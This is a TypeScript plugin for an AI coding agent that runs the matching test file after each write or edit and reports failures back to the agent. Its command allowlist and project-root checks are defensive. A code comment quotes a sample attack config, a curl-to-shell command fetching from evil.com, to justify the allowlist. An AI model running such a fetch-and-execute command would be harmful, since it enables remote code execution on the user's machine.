/**
 * test-runner-gate plugin — PostToolUse hook that runs the relevant
 * test file after every `write` or `edit` to a source file.
 *
 * Tools registered:
 * - test_gate_status : Show config + per-session counters.
 *
 * Hooks registered:
 * - PostToolUse with matcher `write|edit`. After the tool completes,
 *   maps the changed source file to its test file (using configurable
 *   patterns), runs `vitest run <test-file>` and injects the result
 *   as `additionalContext`.
 *
 * Config (`config.extensions['test-runner-gate']`):
 *
 * ```jsonc
 * {
 *   "enabled": true,
 *   "command": "npx vitest run",       // base test command
 *   "timeoutMs": 30000,                // test process timeout
 *   "testFilePatterns": [              // how to derive test path from source
 *     "src/{path}.test.ts",            // co-located: src/foo.ts → src/foo.test.ts
 *     "tests/{name}.test.ts",          // mirror dir: src/foo.ts → tests/foo.test.ts
 *     "tests/{name}-exec.test.ts"      // exec variant
 *   ],
 *   "injectOnPass": false              // inject context when tests pass too?
 * }
 * ```
 *
 * @public
 */

import { execFile } from 'node:child_process';
import { access } from 'node:fs/promises';
import { basename, dirname, isAbsolute, join } from 'node:path';
import type { Plugin } from '@wrongstack/core';
import { withinProject } from '../runtime/index.js';

const API_VERSION = '^0.1.10';

// ---------------------------------------------------------------------------
// Module-scope state (H1 audit pattern)
// ---------------------------------------------------------------------------

const state = {
  invocationCount: 0,
  /** Times a test file was found and tests ran. */
  runCount: 0,
  /** Times tests passed. */
  passCount: 0,
  /** Times tests failed. */
  failCount: 0,
  /** Times no test file was found for the source file. */
  noTestCount: 0,
  /** Times the test runner itself failed (timeout, crash). */
  errorCount: 0,
  /** Times the extension filter short-circuited the hook (.json, .md, etc.). */
  extensionSkippedCount: 0,
  /** Times a re-run was skipped because the source hash matched a previous PASS. */
  cachedSkipCount: 0,
  /** Hook handle for teardown. */
  hookUnregister: null as null | (() => void),
  /** Last test result — surfaced by health() + status tool. */
  lastResult: null as null | {
    sourcePath: string;
    testPath: string;
    passed: boolean;
    testCount: number;
    duration: string;
    when: string;
  },
};

// ---------------------------------------------------------------------------
// Config
// ---------------------------------------------------------------------------

type Runner = 'vitest' | 'jest' | 'mocha' | 'auto';

interface TestGateConfig {
  enabled: boolean;
  runner: Runner;
  command: string;
  timeoutMs: number;
  testFilePatterns: string[];
  injectOnPass: boolean;
  /**
   * When true (default), the plugin fingerprints the source path's
   * last PASSED run and skips re-running tests if the same path
   * shows up again with the same fingerprint within the session.
   * Catches the common case of the model re-touching a file
   * (e.g. during a `format-on-save` or `import-organizer` cycle)
   * and re-spawning vitest for tests we already proved pass.
   */
  enableContentHashCache: boolean;
  /**
   * When true (default), skip files whose extension is clearly not
   * TS/JS (.json, .md, .lock, .txt, …) BEFORE we try to resolve a
   * test file. The default patterns all end in `.test.ts` / `.spec.ts`
   * so the resolve would always come up empty for non-TS files; this
   * is just a fast-path that avoids the filesystem walk.
   */
  enableExtensionFilter: boolean;
}

const DEFAULTS: TestGateConfig = {
  enabled: false,
  runner: 'auto',
  command: '',
  timeoutMs: 30_000,
  testFilePatterns: ['src/{name}.test.ts', 'tests/{name}.test.ts', 'tests/{name}-exec.test.ts'],
  injectOnPass: false,
  enableContentHashCache: true,
  enableExtensionFilter: true,
};

function readConfig(raw: unknown): TestGateConfig {
  if (!raw || typeof raw !== 'object') return { ...DEFAULTS };
  const r = raw as Record<string, unknown>;
  const runner: Runner =
    r['runner'] === 'vitest' || r['runner'] === 'jest' || r['runner'] === 'mocha'
      ? r['runner']
      : 'auto';
  return {
    enabled: r['enabled'] === true,
    runner,
    command: typeof r['command'] === 'string' ? r['command'] : DEFAULTS.command,
    timeoutMs:
      typeof r['timeoutMs'] === 'number' && r['timeoutMs'] > 0
        ? r['timeoutMs']
        : DEFAULTS.timeoutMs,
    testFilePatterns:
      Array.isArray(r['testFilePatterns']) && (r['testFilePatterns'] as unknown[]).length > 0
        ? (r['testFilePatterns'] as unknown[]).filter((x): x is string => typeof x === 'string')
        : DEFAULTS.testFilePatterns,
    injectOnPass: r['injectOnPass'] === true,
    enableContentHashCache: r['enableContentHashCache'] !== false,
    enableExtensionFilter: r['enableExtensionFilter'] !== false,
  };
}

/**
 * File extensions that the default testFilePatterns can possibly
 * resolve a test file for (i.e. patterns ending in `.test.ts`,
 * `.test.tsx`, `.test.js`, `.spec.ts`, etc.). When `enableExtensionFilter`
 * is on, files outside this set short-circuit BEFORE we walk the
 * filesystem. Custom `testFilePatterns` override this — the filter
 * only looks at the LAST candidate's extension, so a user who adds
 * a `.test.json` pattern will not be filtered out.
 */
const TESTABLE_DEFAULT_EXTS = new Set(['.ts', '.tsx', '.js', '.jsx', '.mjs', '.mts', '.cts']);

function getResolvableExtensions(patterns: string[]): Set<string> {
  const exts = new Set<string>();
  for (const p of patterns) {
    // Take the last `.xxx` of the pattern template. Patterns are
    // project-controlled so this is a safe heuristic.
    const m = /\.([a-z0-9]+)$/i.exec(p);
    if (m?.[1]) exts.add(`.${m[1].toLowerCase()}`);
  }
  return exts;
}

/**
 * Tiny non-cryptographic content fingerprint (DJB2) for the
 * per-path cache. Capped at 64 KB to keep the cost bounded on
 * very large source files — the first 64 KB is plenty to detect
 * "same source, retouched".
 */
function pathContentHash(content: string): number {
  const cap = Math.min(content.length, 65536);
  let h = 5381;
  for (let i = 0; i < cap; i++) {
    h = ((h << 5) + h + content.charCodeAt(i)) | 0;
  }
  return h >>> 0;
}

/**
 * Per-path memo: hash of the source content at the last PASSED run.
 * We only cache PASSES because caching failures would freeze broken
 * state — the model needs to see the failure so it knows to fix.
 */
const lastPassedHash = new Map<string, number>();

// ---------------------------------------------------------------------------
// Sandbox: reject paths outside the project root, and lock down the
// `command` config option (config-supplied first token = arbitrary
// binary) to an allowlist of legitimate test runners. test-runner-gate
// runs on every write/edit; an attacker who can write to the plugin
// config can already pivot to test-runner-gate to run any process.
// ---------------------------------------------------------------------------
// withinProject() imported from ../runtime/index.js

// Allowlist for custom test commands. The first token of `command` must
// resolve to one of these binaries. Without this, a config-supplied
// `command: "curl http://evil.com | sh"` (which split() doesn't help
// against because of pipes handled outside spawn) becomes a directed
// process start. We limit to the same runner families that ship with
// the plugin and the bundled npx + pnpm test wrappers.
const ALLOWED_COMMAND_TOKENS = new Set<string>([
  'npx',
  'pnpm',
  'pnpm',
  'npm',
  'yarn',
  'vitest',
  'jest',
  'mocha',
  // Useful for `command: "node ./scripts/run-tests.js"` style configs.
  'node',
  // Direct binary paths under the project's node_modules — resolved
  // by basename in resolveAllowedCommand().
]);

// ---------------------------------------------------------------------------
// Test file resolution
// ---------------------------------------------------------------------------

/**
 * Given a source file path, derive candidate test file paths using the
 * configured patterns. `{name}` = basename without extension,
 * `{path}` = relative path without extension, `{dir}` = dirname.
 *
 * Example: source = "packages/plugins/src/cost-tracker/index.ts"
 *   {name} = "index", {path} = "packages/plugins/src/cost-tracker/index",
 *   {dir} = "packages/plugins/src/cost-tracker"
 *
 * Patterns:
 *   "tests/{name}.test.ts"           → "tests/index.test.ts"
 *   "src/{path}.test.ts"             → "packages/plugins/src/cost-tracker/index.test.ts"
 *   "{dir}/tests/{name}.test.ts"     → ".../cost-tracker/tests/index.test.ts"
 */
function resolveTestFiles(sourcePath: string, patterns: string[]): string[] {
  const name = basename(sourcePath).replace(/\.[^.]+$/, '');
  const pathNoExt = sourcePath.replace(/\.[^.]+$/, '');
  const dir = dirname(sourcePath);

  const candidates: string[] = [];
  for (const pattern of patterns) {
    const candidate = pattern
      .replace(/\{name\}/g, name)
      .replace(/\{path\}/g, pathNoExt)
      .replace(/\{dir\}/g, dir);
    // If the pattern starts with a relative prefix (not absolute),
    // resolve relative to the source file's directory so co-located
    // patterns like "tests/{name}.test.ts" work from the package root.
    if (!candidate.startsWith('/') && !candidate.includes('{')) {
      // For patterns that don't contain {dir}, resolve relative to
      // the project root (cwd). For patterns with {dir}, they're
      // already absolute relative to the source.
      if (pattern.includes('{dir}')) {
        candidates.push(candidate);
      } else {
        // Try both: as-is (project root) and relative to source dir.
        candidates.push(candidate);
        candidates.push(join(dir, candidate));
      }
    }
  }
  return candidates;
}

/**
 * Find the first test file that exists on disk.
 */
async function findTestFile(sourcePath: string, patterns: string[]): Promise<string | null> {
  const candidates = resolveTestFiles(sourcePath, patterns);
  for (const candidate of candidates) {
    try {
      await access(candidate);
      return candidate;
    } catch {
      // not found — try next candidate
    }
  }
  return null;
}

// ---------------------------------------------------------------------------
// Runner detection
// ---------------------------------------------------------------------------

interface RunnerConfig {
  /** The resolved runner name. */
  name: 'vitest' | 'jest' | 'mocha';
  /** Full command prefix (without test file). */
  command: string;
  /** JSON output flag(s) appended after the test file. */
  jsonFlags: string;
}

/**
 * Detect which test runner is available. "auto" tries vitest, then
 * jest, then mocha. Returns the resolved runner + command prefix.
 * Uses `npx <runner> --version` to check availability.
 */
async function detectRunner(requested: Runner): Promise<RunnerConfig | null> {
  const candidates: RunnerConfig[] = [
    { name: 'vitest', command: 'npx vitest run', jsonFlags: '--reporter=json' },
    { name: 'jest', command: 'npx jest', jsonFlags: '--json' },
    { name: 'mocha', command: 'npx mocha', jsonFlags: '--reporter json' },
  ];

  // If a specific runner is requested, try only that one.
  if (requested !== 'auto') {
    const match = candidates.find((c) => c.name === requested);
    if (!match) return null;
    try {
      await new Promise<void>((resolve, reject) => {
        execFile('npx', [`${match.name}`, '--version'], {
          encoding: 'utf-8',
          timeout: 5_000,
          cwd: process.cwd(),
        }, (err) => (err ? reject(err) : resolve()));
      });
      return match;
    } catch {
      return null;
    }
  }

  // Auto: try each in order.
  for (const candidate of candidates) {
    try {
      await new Promise<void>((resolve, reject) => {
        execFile('npx', [`${candidate.name}`, '--version'], {
          encoding: 'utf-8',
          timeout: 5_000,
          cwd: process.cwd(),
        }, (err) => (err ? reject(err) : resolve()));
      });
      return candidate;
    } catch {
      // not available
    }
  }
  return null;
}

// ---------------------------------------------------------------------------
// Test runner
// ---------------------------------------------------------------------------

interface TestRunResult {
  passed: boolean;
  testCount: number;
  failCount: number;
  duration: string;
  /** First few failure messages (for context injection). */
  failures: string[];
}

/**
 * Resolve the first token of `customCommand` against an allowlist of
 * legitimate test runners. Returns `[binary, restArgs]` if allowed,
 * `null` otherwise. This prevents a config-supplied `command` from
 * pivoting the runner hook into arbitrary code execution.
 */
function resolveAllowedCommand(customCommand: string): { cmd: string; args: string[] } | null {
  const tokens = customCommand.split(/\s+/).filter(Boolean);
  if (tokens.length === 0) return null;
  const head = tokens[0]!;
  // Bare binary name on the allowlist → pass through (PATH resolution).
  if (ALLOWED_COMMAND_TOKENS.has(head)) {
    return { cmd: head, args: tokens.slice(1) };
  }
  // Absolute path under the project → must resolve inside and the
  // basename must be in the allowlist.
  if (isAbsolute(head)) {
    if (!withinProject(head)) return null;
    const base = basename(head);
    if (ALLOWED_COMMAND_TOKENS.has(base)) {
      return { cmd: head, args: tokens.slice(1) };
    }
  }
  return null;
}

/**
 * Run the test command on a specific test file and parse the output.
 * Returns null if the runner itself failed (timeout, crash, not found,
 * or the custom command failed the allowlist).
 */
async function runTests(
  testFile: string,
  runner: RunnerConfig,
  customCommand: string,
  timeoutMs: number,
): Promise<TestRunResult | null> {
  // Sandbox: refuse to run tests for paths outside the project root.
  if (!withinProject(testFile)) return null;

  // Use custom command if provided, otherwise use the runner's default.
  // execFile argv-form — no shell interpolation. testFile goes in as
  // its own argv element so quotes/spaces in names cannot escape.
  let cmd: string;
  let cmdArgs: string[];
  let trailingFlag: string;
  if (customCommand) {
    const resolved = resolveAllowedCommand(customCommand);
    if (!resolved) return null;
    cmd = resolved.cmd;
    cmdArgs = [...resolved.args, testFile];
    trailingFlag = runner.jsonFlags;
  } else {
    // runner.command is hard-coded by the plugin (no user input) and
    // looks like "npx vitest run" — split into argv tokens.
    const tokens = runner.command.split(/\s+/).filter(Boolean);
    cmd = tokens[0]!;
    cmdArgs = [...tokens.slice(1), testFile];
    trailingFlag = runner.jsonFlags;
  }
  // trailingFlag is a single space-delimited string from the runner
  // table (e.g. "--reporter=json"). execFile wants its own argv
  // element — split spaces too.
  const trailing = trailingFlag.split(/\s+/).filter(Boolean);
  const fullArgs = [...cmdArgs, ...trailing];
  let stdout = '';
  try {
    const { stdout: out } = await new Promise<{ stdout: string; stderr: string }>(
      (resolve, reject) => {
        execFile(cmd, fullArgs, { encoding: 'utf-8', timeout: timeoutMs, cwd: process.cwd() },
          (err, out, stderr) => {
            if (err) reject(Object.assign(err, { stdout: out, stderr }));
            else resolve({ stdout: out, stderr });
          },
        );
      },
    );
    stdout = out;
  } catch (err: unknown) {
    const e = err as { stdout?: string; killed?: boolean };
    if (e.killed) return null; // timeout
    // vitest exits non-zero when tests fail — stdout has the JSON.
    if (e.stdout) stdout = e.stdout;
    else return null;
  }

  try {
    const data = JSON.parse(stdout);
    const numTotalTests = data.numTotalTests ?? 0;
    const numFailedTests = data.numFailedTests ?? 0;
    const numPassedTests = data.numPassedTests ?? 0;
    const success = data.success ?? numFailedTests === 0;

    // Extract failure messages (up to 5).
    const failures: string[] = [];
    if (data.testResults) {
      for (const fileResult of data.testResults) {
        for (const assertion of fileResult.assertionResults ?? []) {
          if (assertion.status === 'failed') {
            const fullName = assertion.fullName ?? assertion.title ?? 'unknown';
            const message = (assertion.failureMessages?.[0] ?? '').split('\n')[0]?.slice(0, 200);
            failures.push(`${fullName}: ${message}`);
            if (failures.length >= 5) break;
          }
        }
        if (failures.length >= 5) break;
      }
    }

    return {
      passed: success && numFailedTests === 0,
      testCount: numTotalTests,
      failCount: numFailedTests,
      duration: `${data.startTime ? '—' : ''} ${numPassedTests} passed, ${numFailedTests} failed`,
      failures,
    };
  } catch {
    // JSON parse failed — try to extract a summary from plain text.
    const passedMatch = stdout.match(/(\d+)\s+passed/);
    const failedMatch = stdout.match(/(\d+)\s+failed/);
    const passed = passedMatch ? Number.parseInt(passedMatch[1]!, 10) : 0;
    const failed = failedMatch ? Number.parseInt(failedMatch[1]!, 10) : 0;
    return {
      passed: failed === 0,
      testCount: passed + failed,
      failCount: failed,
      duration: `${passed} passed, ${failed} failed`,
      failures: [],
    };
  }
}

// ---------------------------------------------------------------------------
// Plugin
// ---------------------------------------------------------------------------

const plugin: Plugin = {
  name: 'test-runner-gate',
  version: '0.1.0',
  description:
    'PostToolUse hook that runs the relevant test file after every write or edit to a source file',
  apiVersion: API_VERSION,
  capabilities: { tools: true, hooks: true },
  defaultConfig: { ...DEFAULTS },
  configSchema: {
    type: 'object',
    properties: {
      enabled: {
        type: 'boolean',
        default: false,
        description: 'Master switch.',
      },
      runner: {
        type: 'string',
        enum: ['vitest', 'jest', 'mocha', 'auto'],
        default: 'auto',
        description: 'Which test runner to use. "auto" tries vitest first, then jest, then mocha.',
      },
      command: {
        type: 'string',
        default: '',
        description:
          'Custom command prefix (overrides the runner default). Empty = use runner default.',
      },
      timeoutMs: {
        type: 'number',
        minimum: 5000,
        default: 30000,
        description: 'Test process timeout in milliseconds.',
      },
      testFilePatterns: {
        type: 'array',
        items: { type: 'string' },
        default: ['src/{name}.test.ts', 'tests/{name}.test.ts', 'tests/{name}-exec.test.ts'],
        description:
          'Patterns to derive test file from source. {name}=basename, {path}=path-no-ext, {dir}=dirname.',
      },
      injectOnPass: {
        type: 'boolean',
        default: false,
        description: 'Inject additionalContext when tests pass too (default: only on failure).',
      },
      enableContentHashCache: {
        type: 'boolean',
        default: true,
        description:
          'Skip re-running tests when the source path is touched again with the same content hash as a previous PASS in this session.',
      },
      enableExtensionFilter: {
        type: 'boolean',
        default: true,
        description:
          'Fast-path skip for non-TS/JS files (.json, .md, .lock, .txt, ...) before the test-file resolve walk.',
      },
    },
  },

  async setup(api) {
    // Idempotent re-init (H1 pattern).
    state.invocationCount = 0;
    state.runCount = 0;
    state.passCount = 0;
    state.failCount = 0;
    state.noTestCount = 0;
    state.errorCount = 0;
    state.extensionSkippedCount = 0;
    state.cachedSkipCount = 0;
    state.hookUnregister = null;
    state.lastResult = null;
    lastPassedHash.clear();

    const cfg = readConfig(api.config.extensions?.['test-runner-gate']);

    // Detect runner at setup time.
    const runner = await detectRunner(cfg.runner);
    if (!runner) {
      api.log.warn(
        'test-runner-gate: no test runner found (vitest, jest, mocha) — hook will be a no-op',
        {
          requested: cfg.runner,
        },
      );
    } else {
      api.log.info('test-runner-gate: detected runner', { name: runner.name });
    }

    const hook = async (input: {
      toolName?: string | undefined;
      toolInput?: unknown;
      toolResult?: { content: string; isError: boolean } | undefined;
    }): Promise<{ additionalContext?: string | undefined } | void> => {
      if (!cfg.enabled || !runner) return;

      // Skip if the write/edit itself errored.
      if (input.toolResult?.isError) return;

      const inp = (input.toolInput ?? {}) as Record<string, unknown>;
      const sourcePath = inp['path'] as string | undefined;
      if (!sourcePath || typeof sourcePath !== 'string') return;

      // Sandbox: refuse to derive a test path for source files outside
      // the project root. Without this guard a prompt-injected write at
      // /etc/passwd or C:\Windows could trigger test runs against
      // attacker-controlled candidates.
      if (!withinProject(sourcePath)) return;

      // Skip if the file being edited IS a test file — running tests
      // on a test file that was just modified is fine, but the LLM
      // likely already knows the result from the tool output.
      if (sourcePath.includes('.test.') || sourcePath.includes('.spec.')) return;

      // Fast-path: if the file extension cannot possibly resolve to
      // a test file under the current patterns (e.g. .json, .md,
      // .lock, .txt), bail out BEFORE the filesystem walk and BEFORE
      // bumping invocationCount. The walk would always return null
      // for these; the filter just avoids the cost. User-supplied
      // patterns override the default ext list, so we derive
      // resolvable extensions from the patterns themselves.
      if (cfg.enableExtensionFilter) {
        const ext = sourcePath.includes('.')
          ? sourcePath.slice(sourcePath.lastIndexOf('.')).toLowerCase()
          : '';
        const resolvable = getResolvableExtensions(cfg.testFilePatterns);
        if (ext && !resolvable.has(ext) && !TESTABLE_DEFAULT_EXTS.has(ext)) {
          state.extensionSkippedCount += 1;
          api.metrics.counter('extension_skipped');
          return;
        }
      }

      state.invocationCount += 1;

      // Content-hash dedupe: if a previous PASS for this path
      // recorded the same content fingerprint, skip the test run.
      // Catches the "format-on-save / import-organizer re-touches the
      // file right after the test already passed" pattern.
      if (cfg.enableContentHashCache) {
        const content =
          input.toolName === 'write'
            ? ((inp['content'] as unknown) ?? '')
            : input.toolName === 'edit'
              ? ((inp['new_string'] as unknown) ?? '')
              : '';
        if (typeof content === 'string' && content.length > 0) {
          const hash = pathContentHash(content);
          const last = lastPassedHash.get(sourcePath);
          if (last !== undefined && last === hash) {
            state.cachedSkipCount += 1;
            api.metrics.counter('cached_skip');
            return;
          }
        }
      }

      // Find the corresponding test file.
      const testFile = await findTestFile(sourcePath, cfg.testFilePatterns);
      if (!testFile) {
        state.noTestCount += 1;
        return; // no test file found — silent
      }

      // Run the tests.
      const result = await runTests(testFile, runner, cfg.command, cfg.timeoutMs);
      if (!result) {
        state.errorCount += 1;
        return; // runner failed — silent
      }

      state.runCount += 1;
      state.lastResult = {
        sourcePath,
        testPath: testFile,
        passed: result.passed,
        testCount: result.testCount,
        duration: result.duration,
        when: new Date().toISOString(),
      };

      if (result.passed) {
        state.passCount += 1;
        // Record content hash on PASS so enableContentHashCache can dedupe.
        if (cfg.enableContentHashCache) {
          const content =
            input.toolName === 'write'
              ? ((inp['content'] as unknown) ?? '')
              : input.toolName === 'edit'
                ? ((inp['new_string'] as unknown) ?? '')
                : '';
          if (typeof content === 'string' && content.length > 0) {
            lastPassedHash.set(sourcePath, pathContentHash(content));
          }
        }
        if (!cfg.injectOnPass) return; // silent on pass (default)
        return {
          additionalContext:
            `\n✅ test-runner-gate: ${result.testCount} test(s) passed for ${testFile} ` +
            `(${result.duration}). Source: ${sourcePath}.`,
        };
      }

      // Tests failed — inject failure details.
      state.failCount += 1;
      const failureList =
        result.failures.length > 0 ? '\n' + result.failures.map((f) => `  ❌ ${f}`).join('\n') : '';
      const truncated =
        result.failCount > 5 ? `\n  … and ${result.failCount - 5} more failure(s)` : '';

      api.log.warn(`test-runner-gate: ${result.failCount} test(s) failed for ${testFile}`, {
        source: sourcePath,
      });

      return {
        additionalContext:
          `\n❌ test-runner-gate: ${result.failCount} of ${result.testCount} test(s) FAILED for ${testFile} ` +
          `after editing ${sourcePath}.${failureList}${truncated}\n` +
          `Fix the failing tests or revert the change if it broke something.`,
      };
    };

    state.hookUnregister = api.registerHook('PostToolUse', 'write|edit', hook, { background: true });

    // --- test_gate_status tool ---
    api.tools.register({
      name: 'test_gate_status',
      description:
        'Reports test-runner-gate state: command, patterns, and per-session pass/fail/error/no-test counters.',
      inputSchema: { type: 'object', properties: {} },
      permission: 'auto',
      category: 'Testing',
      mutating: false,
      async execute() {
        return {
          ok: true,
          enabled: cfg.enabled,
          runner: runner?.name ?? 'none',
          command: cfg.command || runner?.command || '',
          timeoutMs: cfg.timeoutMs,
          testFilePatterns: cfg.testFilePatterns,
          injectOnPass: cfg.injectOnPass,
          counters: {
            invocations: state.invocationCount,
            runs: state.runCount,
            passed: state.passCount,
            failed: state.failCount,
            noTest: state.noTestCount,
            errors: state.errorCount,
            extensionSkipped: state.extensionSkippedCount,
            cachedSkips: state.cachedSkipCount,
          },
          lastResult: state.lastResult,
        };
      },
    });

    api.log.info('test-runner-gate plugin loaded', {
      version: '0.1.0',
      command: cfg.command,
      patterns: cfg.testFilePatterns.length,
    });
  },

  teardown(api) {
    if (state.hookUnregister) {
      try {
        state.hookUnregister();
      } catch {
        // best-effort
      }
      state.hookUnregister = null;
    }
    const final = {
      invocations: state.invocationCount,
      runs: state.runCount,
      passed: state.passCount,
      failed: state.failCount,
      noTest: state.noTestCount,
      errors: state.errorCount,
      extensionSkipped: state.extensionSkippedCount,
      cachedSkips: state.cachedSkipCount,
    };
    state.invocationCount = 0;
    state.runCount = 0;
    state.passCount = 0;
    state.failCount = 0;
    state.noTestCount = 0;
    state.errorCount = 0;
    state.extensionSkippedCount = 0;
    state.cachedSkipCount = 0;
    state.lastResult = null;
    lastPassedHash.clear();
    api.log.info('test-runner-gate: teardown complete', { final });
  },

  async health() {
    return {
      ok: true,
      message:
        state.lastResult === null
          ? `test-runner-gate: ${state.invocationCount} invocation(s), ${state.runCount} test run(s)`
          : state.lastResult.passed
            ? `test-runner-gate: last run PASSED (${state.lastResult.testCount} tests) on ${state.lastResult.testPath}`
            : `test-runner-gate: last run FAILED (${state.lastResult.testCount} tests) on ${state.lastResult.testPath} at ${state.lastResult.when}`,
      counters: {
        invocations: state.invocationCount,
        runs: state.runCount,
        passed: state.passCount,
        failed: state.failCount,
        noTest: state.noTestCount,
        errors: state.errorCount,
        extensionSkipped: state.extensionSkippedCount,
        cachedSkips: state.cachedSkipCount,
      },
      lastResult: state.lastResult,
    };
  },
};

export default plugin;
